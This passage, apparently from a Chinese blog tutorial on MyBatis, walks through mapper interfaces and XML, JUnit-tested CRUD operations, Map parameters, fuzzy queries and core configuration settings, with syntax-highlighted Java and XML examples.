class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Dao接口</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">getUserList</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接口实现类由原来的UserDaoImp转变成一个Mapper配置文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定一个对应的Dao/Mapper接口--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.jh2ng.dao.UserDao&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--id对应方法名，结果类型指向对应实体类--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserList&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.jh2ng.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        select * from users;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-4、测试"><a href="#2-4、测试" class="headerlink" title="2.4、测试"></a>2.4、测试</h3><ul><li>junit</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">        <span class="comment">// getMapper</span></span><br><span class="line">        <span class="type">UserDao</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserDao.class);</span><br><span class="line">        List&lt;User&gt; userList = mapper.getUserList();</span><br><span class="line">        <span class="keyword">for</span>(User user:userList)&#123;</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭sqlSession</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><font color="red">注意1:</font></p><p>is not known to the MapperRegistry.</p><p>每一个Mapper.xml都需要在Mybatis核心配置文件中注册</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/jh2ng/dao/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><font color="red">注意2:</font></p><p>Error parsing SQL Mapper Configuration. Cause: java.io.IOException: Could not find resource</p><p>配置路径正确，却还是提示无法找到Mapper.xml，解决如下</p><p>配置文件无法被导出或者生效的解决办法：</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--在build中配置resources，来防止资源导出失败的问题--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3、CRUD"><a href="#3、CRUD" class="headerlink" title="3、CRUD"></a>3、CRUD</h2><blockquote><p><strong>把dao改成mapper</strong></p><p><strong><font color="red">注意：增删改需要提交事务</font></strong></p></blockquote><h3 id="3-1、select"><a href="#3-1、select" class="headerlink" title="3.1、select"></a>3.1、select</h3><p>查询语句</p><ul><li>id：对应的namespace中的方法名</li><li>resultType：SQL语句执行的返回值</li><li>parameterType：参数类型</li></ul><p>1.编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据id查询用户</span></span><br><span class="line">User <span class="title function_">getUserById</span><span class="params">(<span class="type">int</span> id)</span>;</span><br></pre></td></tr></table></figure><p>2.编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.jh2ng.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    select * from users where id=#&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserById</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">    <span class="comment">// getMapper</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.getUserById(<span class="number">1</span>);</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2、insert"><a href="#3-2、insert" class="headerlink" title="3.2、insert"></a>3.2、insert</h3><p>1.编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 插入一个用户</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">addUser</span><span class="params">(User user)</span>;</span><br></pre></td></tr></table></figure><p>2.编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--对象中的属性可以直接取出来--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;addUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.jh2ng.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    insert into users(id,name,passwd) values (#&#123;id&#125;,#&#123;name&#125;,#&#123;passwd&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addUser</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">    <span class="comment">// getMapper</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> mapper.addUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">4</span>, <span class="string">&quot;ddd&quot;</span>, <span class="string">&quot;111&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (res &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;插入成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//增删改需要提交事务</span></span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br></pre></td></tr></table></figure><h3 id="3-3、update"><a href="#3-3、update" class="headerlink" title="3.3、update"></a>3.3、update</h3><p>1.编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改一个用户</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">updateUser</span><span class="params">(User user)</span>;</span><br></pre></td></tr></table></figure><p>2.编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.jh2ng.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    update users set  name=#&#123;name&#125;,passwd=#&#123;passwd&#125;  where id=#&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateUser</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">    <span class="comment">// getMapper</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    mapper.updateUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">4</span>,<span class="string">&quot;fff&quot;</span>,<span class="string">&quot;123&quot;</span>));</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4、delete"><a href="#3-4、delete" class="headerlink" title="3.4、delete"></a>3.4、delete</h3><p>1.编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 删除一个用户</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">deleteUser</span><span class="params">(<span class="type">int</span> id)</span>;</span><br></pre></td></tr></table></figure><p>2.编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">    delete from users where id=#&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteUser</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">    <span class="comment">// getMapper</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    mapper.deleteUser(<span class="number">4</span>);</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5、万能Map"><a href="#3-5、万能Map" class="headerlink" title="3.5、万能Map"></a>3.5、万能Map</h3><p>假设我们的实体类或者数据库中的表字段或者参数过多，应该考虑使用Map。</p><p>Map传递参数，直接在sql语句中取出key即可。</p><p>对象传递参数，直接在sql语句中取对象的属性即可。</p><p>只有一个基本类型参数的情况下，可以直接在sql中取到。</p><blockquote><p>只有一个参数可以不用写parameterType</p><p>例如通过一个id或者是一个用户名去查询的时候可以忽略不写parameterType</p></blockquote><p>多参数用map或者<strong>注解</strong>。</p><p>比如，有十几个字段的数据库，只想修改其中的几个字段，可以使用Map来实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改一个用户</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">updateUser1</span><span class="params">(Map&lt;String,Object&gt; map)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateUser1&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;map&quot;</span>&gt;</span></span><br><span class="line">    update users set  name=#&#123;username&#125;  where id=#&#123;userid&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>现在sql中的参数和map里的key对应</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateUser1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">    <span class="comment">// getMapper</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;userid&quot;</span>,<span class="number">3</span>);</span><br><span class="line">    map.put(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">    mapper.updateUser1(map);</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-6、模糊查询"><a href="#3-6、模糊查询" class="headerlink" title="3.6、模糊查询"></a>3.6、模糊查询</h3><p>模糊查询实现的几种方式</p><p>1.Java代码执行的时候，传递通配符%%</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; userList = mapper.getUserByName(<span class="string">&quot;%a%&quot;</span>);</span><br></pre></td></tr></table></figure><p>2.在sql拼接中使用通配符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> name <span class="keyword">like</span> &quot;%&quot;#&#123;name&#125;&quot;%&quot;</span><br></pre></td></tr></table></figure><blockquote><p>第一种不方便，第二种会造成sql注入</p></blockquote><p>3.借助mysql函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> name <span class="keyword">like</span> concat(<span class="string">&#x27;%&#x27;</span>,#&#123;name&#125;,<span class="string">&#x27;%&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="4、配置解析"><a href="#4、配置解析" class="headerlink" title="4、配置解析"></a>4、配置解析</h2><h3 id="4-1、核心配置文件"><a href="#4-1、核心配置文件" class="headerlink" title="4.1、核心配置文件"></a>4.1、核心配置文件</h3><ul><li>mybatis-config.xml</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">properties（属性）</span><br><span class="line">settings（设置）</span><br><span class="line">typeAliases（类型别名）</span><br><span class="line">typeHandlers（类型处理器）</span><br><span class="line">objectFactory（对象工厂）</span><br><span class="line">plugins（插件）</span><br><span class="line">environments（环境配置）</span><br><span class="line">environment（环境变量）</span><br><span class="line">transactionManager（事务管理器）</span><br><span class="line">dataSource（数据源）</span><br><span class="line">databaseIdProvider（数据库厂商标识）</span><br><span class="line">mappers（映射器）</span><br></pre></td></tr></table></figure><h3 id="4-2、环境配置（environments）"><a href="#4-2、环境配置（environments）" class="headerlink" title="4.2、环境配置（environments）"></a>4.2、环境配置（environments）</h3><p>MyBatis 可以配置成适应多种环境。</p><p><strong>不过要记住：尽管可以配置多个环境，但每个 SqlSessionFactory 实例只能选择一种环境。</strong></p><p>可以有多套environment，每个environment有单独的id，通过environments中default属性进行环境切换。</p><p>Mybatis默认的事务管理器是JDBC，连接池：POOLED</p><h3 id="4-3、属性（properties）"><a href="#4-3、属性（properties）" class="headerlink" title="4.3、属性（properties）"></a>4.3、属性（properties）</h3><p>可以通过properties属性来实现引用配置文件。</p><p>属性可以在外部进行配置，并可以进行动态替换。你既可以在典型的 Java 属性文件【db.properties】中配置这些属性，也可以在 properties 元素的子元素中设置。</p><p>编写一个配置文件db.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">driver</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="attr">url</span>=<span class="string">jdbc:mysql://localhost:3306/test?useSSL=true&amp;useUnicode=true&amp;characterEncoding=utf-8</span></span><br><span class="line"><span class="attr">username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">123456</span></span><br></pre></td></tr></table></figure><p>在核心配置文件中引入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;db.properties&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>可以直接引入外部文件</li><li>可以在其中增加一些属性配置</li><li>如果两个文件有同一个字段，优先使用外部配置文件</li></ul><h3 id="4-4、类型别名（typeAliases）"><a href="#4-4、类型别名（typeAliases）" class="headerlink" title="4.4、类型别名（typeAliases）"></a>4.4、类型别名（typeAliases）</h3><ul><li>类型别名是为Java类型设置一个短的名字。</li><li>意在降低冗余的全限定类名书写。</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">type</span>=<span class="string">&quot;com.jh2ng.pojo.User&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;User&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以指定一个包名，MyBatis 会在包名下面搜索需要的 Java Bean。</p><p>扫描实体类的包，它的默认别名为这个类名的首字母小写</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.jh2ng.pojo&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>在实体类少的时候使用第一种方法</p><p>在实体类多的时候使用第二种方法</p><p>第一种可以自定义，第二种可以用注解自定义别名，实体类中加注解<code>@Alias(&quot;别名&quot;)</code></p></blockquote><h3 id="4-5、设置（settings）"><a href="#4-5、设置（settings）" class="headerlink" title="4.5、设置（settings）"></a>4.5、设置（settings）</h3><p><img src="https://image.jh2ing.com/image-20210522130333173.png" alt="image-20210522130333173"></p><p><img src="https://image.jh2ing.com/image-20210522124707379.png" alt="image-20210522124707379"></p><h3 id="4-6、其他配置"><a href="#4-6、其他配置" class="headerlink" title="4.6、其他配置"></a>4.6、其他配置</h3><ul><li><a href="https://mybatis.org/mybatis-3/zh/configuration.html#typeHandlers">typeHandlers（类型处理器）</a></li><li><a href="https://mybatis.org/mybatis-3/zh/configuration.html#objectFactory">objectFactory（对象工厂）</a></li><li>plugins（插件）<ul><li>Mybatis-Plus</li><li>Mybatis-generator-core</li><li>通用mapper</li></ul></li></ul><h3 id="4-7、映射器（mappers）"><a href="#4-7、映射器（mappers）" class="headerlink" title="4.7、映射器（mappers）"></a>4.7、映射器（mappers）</h3><p>MapperRegistry：注册绑定mapper文件</p><p>方式一：【推荐使用】</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/jh2ng/dao/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><p>方式二：使用class文件绑定注册</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span 